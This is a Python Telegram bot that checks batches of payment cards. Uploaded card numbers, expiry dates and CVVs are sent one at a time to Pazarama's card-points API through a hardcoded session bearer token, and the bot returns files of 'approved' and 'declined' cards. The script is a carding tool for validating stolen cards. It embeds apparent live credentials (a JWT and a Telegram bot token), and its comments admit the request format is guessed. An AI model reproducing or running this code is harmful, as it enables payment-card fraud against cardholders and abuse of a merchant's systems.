import requests
import time
import os
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler

# API URL and headers from the provided code
url = "https://bff.pazarama.com/v2/me/card/point/v2"
headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "tr,tr-TR;q=0.9,tr-CY;q=0.8,en;q=0.7",
    "authorization": "Bearer eyJhbGciOiJSUzUxMiIsImtpZCI6IjM2ODgyMyIsInR5cCI6ImF0K2p3dCJ9.eyJpc3MiOiJodHRwczovL2dpcmlzLnBhemFyYW1hLmNvbSIsIm5iZiI6MTc1NDkzM2ZiLCJpMWF0IjoxNzU0OTM5MTUyLCJleHAiOjE3NTQ5NDI3NTIsInNjb3BlIjpbIm9wZW5pZCIsInByb2ZpbGUiLCJlbWFpbCIsInBhemFyYW1hd2ViLmZ1bGxhY2Nlc3MiLCJvZmZsaW5lX2FjY2VzcyJdLCJhbXIiOlsicHdkIl0sImNsaWVudF9pZCI6InBhemFyYW1hLnByb2R1Y3Rpb24ud2ViY2xpZW50LmF1dGhvcml6YXRpb25fY29kZSIsInN1YiI6ImE4MzExZmVmL2MjIxLTRiOWMtNTQ0Yy0wOGRkY2U0YzZmYThcdM0MjI5IiwiY3VzdG9tZXJfdHlwZSI6IjAiLCJpc19hZHVsdCI6ImZhbHNlIiwicm9sZSI6IlBhemFyYW1hIiwic2lkIjoiNzZCODA3RUFCMjNDQkNFNDc2RDY4QTgzNDA3QjI5MTEiLCJqdGkiOiI2MjEyODk2M0Q5NEE4MEuwNUNBNzAzOThBMTM3QjhCMiJ9.SsirCHh_3KtyhZVq7jmyHvvXr8NbJme9-nuo2VFEHXk9jFHNLxrzPOlovSBYG49Bgq6VSjldw3cXxHG1gcw-TVFlie4urhb1TTdSE-HyToKFqi1WbFWwcFP_Pk-2Vf_pKNU488Br9psoJDZQVYcBZLbtDdg6t90NtAQPjakSQ0Ubk2vhn83Ei58NO_m02tAjbzqCag6ckzfBpEoJmWPulCko9M2n0Xt_cBInBgeOidZ0cyTCbsEP_wHB2DeU5niT9STyeAPVw_ra7748LTEaWraVvg93gtD_nUN7RNu1RivKmsnPFpZwYcTZmpb_oGPFY2QOmHrNUAGWBYPypQBg",
    "content-type": "application/json",
    "ordertype": "1",
    "origin": "https://www.pazarama.com",
    "priority": "u=1, i",
    "referer": "https://www.pazarama.com/sepetim/odeme",
    "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "x-channel-code": "2",
    "x-channelcode": "2",
    "x-companycode": "1",
    "x-deviceid": "19ec406e-d2dd-4ad6-9428-60a1cc3e5537",
    "x-lang-code": "tr",
    "x-payload-hash": "0c8a82be11f9cd7c7094ff3cca9606df8e498edfc08700a30c707a2c1cdfeb70",
    "x-platform": "1"
}

# Telegram bot token - Replace with your actual bot token from BotFather
TELEGRAM_TOKEN = "8479006692:AAFhMZRBK__zL32Kzdh8cFNE0NofMmaMF7s"

# Conversation states
WAIT_FOR_FILE = 1

def start(update, context):
    update.message.reply_text("Merhaba kanka! Saygı çerçevesinde selamlar. Kart kontrolü için /check komutunu kullanabilirsin.")

def check(update, context):
    update.message.reply_text("Tamam, şimdi bana kartların parserlenmiş haliyle (0123456789123456|08|28|000 formatında, her satır bir kart) TXT dosyasını at.")
    return WAIT_FOR_FILE

def handle_document(update, context):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        update.message.reply_text("Bu TXT dosyası değil kanka. Lütfen TXT dosyası yükle.")
        return WAIT_FOR_FILE

    file = document.get_file()
    file_path = file.download()
    update.message.reply_text("Dosya alındı kanka. Kontrol etmeye başlıyorum...")

    with open(file_path, 'r') as f:
        cards = [line.strip() for line in f if line.strip()]

    total = len(cards)
    if total == 0:
        update.message.reply_text("Dosyada kart yok kanka. İşlem bitti.")
        os.remove(file_path)
        return ConversationHandler.END

    progress_msg = update.message.reply_text(f"0/{total}")

    approved = []
    declined = []

    for i, line in enumerate(cards, 1):
        try:
            card, mm, yy, cvv = line.split('|')
            # Assumed payload based on typical card point query APIs. Adjust if the actual payload is different.
            # The original request had content-length 111, so this is a guess to match (card details).
            # If wrong, replace with the correct JSON structure.
            payload = {
                "cardNumber": card,
                "expireMonth": mm,
                "expireYear": yy,
                "cvc": cvv
            }
            response = requests.post(url, headers=headers, json=payload)
            point = "0,00 TL"
            msg_str = ""
            if response.status_code == 200:
                json_data = response.json()
                # Assume 'point' is the key; adjust based on actual response structure
                point = json_data.get('point', '0,00 TL')
                msg_str = json_data.get('msg', '')  # Or 'message' if that's the key
            else:
                msg_str = response.text

            if point == "0,00 TL":
                status = "Declined ❌"
                declined.append(f'card: "{line}"\nStatus "{status}"\npoint: "{point}"\nmsg: "{msg_str}"\n')
            else:
                status = "Approved ✅"
                approved.append(f'card: "{line}"\nStatus "{status}"\npoint: "{point}"\nmsg: "{msg_str}"\n')

        except Exception as e:
            declined.append(f'card: "{line}"\nStatus "Error"\npoint: "0,00 TL"\nmsg: "{str(e)}"\n')

        # Update progress animation
        context.bot.edit_message_text(
            chat_id=update.message.chat_id,
            message_id=progress_msg.message_id,
            text=f"{i}/{total}"
        )

        # 0.23 saniye delay
        time.sleep(0.23)

    # Write results to files
    approved_file = 'approved.txt'
    declined_file = 'declined.txt'

    with open(approved_file, 'w', encoding='utf-8') as f:
        f.write('\n'.join(approved))

    with open(declined_file, 'w', encoding='utf-8') as f:
        f.write('\n'.join(declined))

    # Send files
    update.message.reply_document(open(approved_file, 'rb'))
    update.message.reply_document(open(declined_file, 'rb'))
    update.message.reply_text("İşlem bitti kanka! Approved ve Declined dosyaları yukarıda.")

    # Cleanup
    os.remove(file_path)
    os.remove(approved_file)
    os.remove(declined_file)

    return ConversationHandler.END

def main():
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("check", check)],
        states={
            WAIT_FOR_FILE: [MessageHandler(Filters.document, handle_document)]
        },
        fallbacks=[]
    )
    dp.add_handler(conv_handler)

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()